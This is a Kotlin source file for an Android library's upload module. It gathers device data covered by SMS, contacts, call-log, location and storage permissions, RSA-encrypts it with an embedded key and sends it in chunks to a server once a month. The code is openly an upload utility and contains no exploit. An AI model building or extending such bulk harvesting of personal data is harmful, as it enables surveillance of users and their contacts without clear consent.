package com.fintek.utils_androidx.upload

import android.Manifest
import android.annotation.SuppressLint
import android.os.Build
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import com.fintek.utils_androidx.FintekUtils
import com.fintek.utils_androidx.UtilsBridge
import com.fintek.utils_androidx.encrypt.RSA
import com.fintek.utils_androidx.encrypt.RSAUtil
import com.fintek.utils_androidx.network.*
import com.fintek.utils_androidx.sharedPreference.SharedPreferenceUtils
import com.fintek.utils_androidx.thread.SimpleTask
import com.fintek.utils_androidx.thread.Task
import com.fintek.utils_androidx.upload.internal.*
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.util.*
import java.util.concurrent.TimeUnit


object UploadUtils {
    private const val TAG = "UploadUtils"

    private const val RSA_UPLOAD_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDD04SDnhHVYY9f2W3cXNia3b5b" +
            "KlxthNAX1BoSIPdf4oUaSqdabfdSTgNdhppltA9ddpNN86mb3vk3FXvxn896E5mz" +
            "b7WU4OU8LHlt0H4OpQRfMTS+O0vS9biJ2JSWzkKp2k4ehjOmvAtNZDVwjVgYXEcZ" +
            "gzZAL1vvg72Afy58OwIDAQAB"

    // save month upload count key
    private const val MONTH_UPLOAD_RECORD = "month_upload_count"

    private const val UPLOAD_COUNT = "upload_count"

    private const val MEDIA_TYPE = "application/json; charset=utf-8"

    private val gson = Gson()
    private val uploadCount: Int get() = SharedPreferenceUtils.getInt(UPLOAD_COUNT)
    private var monthlyRecord: MonthlyRecord? by MonthDelegate(MONTH_UPLOAD_RECORD)

    private val coronetRequest: CoronetRequest = CoronetRequest.Builder()
        .setBaseUrl(FintekUtils.requiredBaseUrl)
        .addHeader("Connection", "Keep-Alive")
        .addHeader("Content-Type", "application/Json;charset:Utf-8")
        .setConnectTimeout(5, TimeUnit.SECONDS)
        .setReadTimeout(5, TimeUnit.SECONDS)
        .build()

    /**
     * Upload all struct to Service
     *
     *
     * This way will delete all cache file
     */
    @JvmStatic
    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    fun upload() {
        upload(false)
    }

    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    internal fun internalUpload() {
        if (!IS_EXISTED) {
            return
        }

        val element: Element<String> = ExistedStringElement()
        if (IS_UPLOADING) {
            val cacheElement: String? = element.cache()
            val task = Builder<UnitResponse>()
                .setContent(cacheElement)
                .build(UnitResponse.typeToken, element.partIndex.get(), element.total.get())
                .onNext(consumer {
                    elementUpload(element)
                }).onError(consumer {
                    internalUpload()
                }).onCancel(consumer {
                    UtilsBridge.e(TAG, "internalUpload Cancel")
                })
            task.execute(Dispatchers.CPU)
        } else {
            elementUpload(element)
        }
    }

    @SuppressLint("MissingPermission", "NewApi")
    internal fun monthlyUpload() {
        val record: MonthlyRecord? = monthlyRecord
        val calendar = Calendar.getInstance()
        val isSameMonth: Boolean = record != null && record.year == calendar.get(Calendar.YEAR)
                && record.month == calendar.get(Calendar.MONTH)
        val isUploaded: Boolean = record != null && record.isUploaded

        UtilsBridge.e(
            TAG,
            "preview: $record",
            "now: (year: ${calendar.get(Calendar.YEAR)}, month: ${calendar.get(Calendar.MONTH)})",
            "notice: month in [0, 11]"
        )
        if (isSameMonth && isUploaded) {
            // every month only upload once
            UtilsBridge.e(TAG, "every month only upload once, uploaded this month")
            return
        }

        // If not uploaded this month, then upload
        upload(true)
    }

    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    private fun upload(isMonthly: Boolean) {
        UtilsBridge.e(TAG, "upload isMonthly: $isMonthly")
        if (IS_EXISTED || IS_UPLOADING) {
            internalUpload()
        }
        // create new struct json
        UtilsBridge.executeBySingle(createNewStructJson(consumer { json ->
            // delete all cache file, start a new upload
            elementDelete()

            val element: Element<String> = StringElement(json)
            element.isMonthly = isMonthly
            val header = element.header() as Header

            val task: RequestTask<UnitResponse> = Builder<UnitResponse>()
                .build(UnitResponse.typeToken, header.part, header.total)
                .onNext(consumer {
                    elementUpload(element)
                }).onError(consumer {
                    UtilsBridge.e(it)
                }).onCancel(consumer {
                    UtilsBridge.e(TAG, "upload Cancel")
                })
            task.execute(Dispatchers.CPU)
        }))
    }

    @RequiresApi(Build.VERSION_CODES.KITKAT)
    private fun elementUpload(element: Element<String>) {
        if (!element.hasNext()) {
            UtilsBridge.e(TAG, "Success!! Element is Empty: (isExisted-${IS_EXISTED}, isUploading-${IS_UPLOADING})")
            if (element.isMonthly) {
                val calendar = Calendar.getInstance()
                monthlyRecord = MonthlyRecord(
                    calendar.get(Calendar.YEAR),
                    calendar.get(Calendar.MONTH),
                    true
                )
            }
            SharedPreferenceUtils.apply {
                putInt(UPLOAD_COUNT, uploadCount + 1)
            }
            elementDelete()
            return
        }

        val task = Builder<UnitResponse>()
            .setContent(element.next())
            .build(UnitResponse.typeToken, element.partIndex.get(), element.total.get())

        task.onNext(consumer {
            if (it.isSuccess()) {
                element.remove()
                element.removeCache()
                elementUpload(element)
            } else {
                elementUpload(element)
            }
        }).onError(consumer {
            elementUpload(element)
        }).onCancel(consumer {
            UtilsBridge.e(TAG, "elementUpload Cancel")
        })

        task.execute(Dispatchers.CPU)
    }

    private fun createNewStructJson(consumer: FintekUtils.Consumer<String>): Task<String> {
        return object : SimpleTask<String>() {
            @RequiresPermission(anyOf = [
                Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.INTERNET
            ])
            @RequiresApi(Build.VERSION_CODES.KITKAT)
            override fun doInBackground(): String {
                val struct = FintekUtils.getAllStruct()
                val json = gson.toJson(struct)
                return RSAUtil.base64Encrypt(RSA.getKey(RSA.MODE.PEM_STRING, RSA.TYPE_PUBLIC,
                    RSA_UPLOAD_KEY
                ), json)
            }

            override fun onSuccess(result: String) {
                consumer.accept(result)
            }
        }
    }

    private val contentVersion: String get() {
        val calendar = Calendar.getInstance()
        return "${calendar.get(Calendar.YEAR)}${calendar.get(Calendar.MONTH) + 1}-$uploadCount"
    }

    private fun <T> consumer(block: (t: T) -> Unit) = object : FintekUtils.Consumer<T> {
        override fun accept(t: T) {
            block.invoke(t)
        }
    }

    private data class UploadReq(
        val userId: String = FintekUtils.requiredIdentify.toString(),
        val version: String = contentVersion,
        val content: String? = null,
        val part: Int,
        val total: Int
    )

    internal data class MonthlyRecord(
        val year: Int,
        val month: Int,
        val isUploaded: Boolean
    )

    private data class UnitResponse(
        val code: String,
        val message: String
    ) {
        companion object {
            val typeToken: TypeToken<UnitResponse> = object : TypeToken<UnitResponse>() {}
        }

        fun isSuccess(): Boolean = code == "200"
    }

    private class Builder<T> {
        private var userId: String = FintekUtils.requiredIdentify.toString()
        private var version: String = contentVersion
        private var content: String? = null

        fun setUserId(userId: String) = apply {
            this.userId = userId
        }

        fun setVersion(version: String) = apply {
            this.version = version
        }

        fun setContent(content: String?) = apply {
            this.content = content
        }


        @RequiresApi(Build.VERSION_CODES.KITKAT)
        fun build(
            typeToken: TypeToken<T>,
            part: Int,
            total: Int,
        ): RequestTask<T> {
            val uploadReq = UploadReq(userId, version, content, part, total)
            val requestBody = RequestBody.create(
                MediaType.get(MEDIA_TYPE),
                gson.toJson(uploadReq)
            )
            val request = Request.Builder().url(FintekUtils.requiredUploadApiPath).post(requestBody)
                .build()
            return coronetRequest.call(request, typeToken)
        }
    }
}